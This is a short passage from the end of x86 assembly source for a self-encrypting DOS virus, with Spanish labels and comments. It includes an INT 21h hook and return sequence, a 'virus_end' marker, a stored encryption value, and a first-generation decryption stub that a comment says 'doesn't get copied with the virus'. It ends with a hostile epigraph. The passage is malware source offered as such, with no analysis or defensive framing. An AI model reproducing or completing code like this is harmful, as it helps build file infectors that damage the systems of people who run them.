                   call    dword ptr cs:[int21h]
                   mov     bp,sp
                   add     word ptr ss:[bp],2
                   xor     bp,bp
                   iret

   virus_end   label byte

   encryptvalue:   dw  0           ; Valor de encriptaci¢n


     ; This is to start deencrypting only from the first infection: this part
     ;doesn't get copied with the virus

   fuera_desencriptado:

         xor   bp,bp
         mov   word ptr cs:[encrypt_start-2+bp],rut_desencriptado-encrypt_start
         ret

   CODIGO ENDS
    END Comienzo

   ;    This Is Your World In Which We Grow, And We Will Grow To Hate You
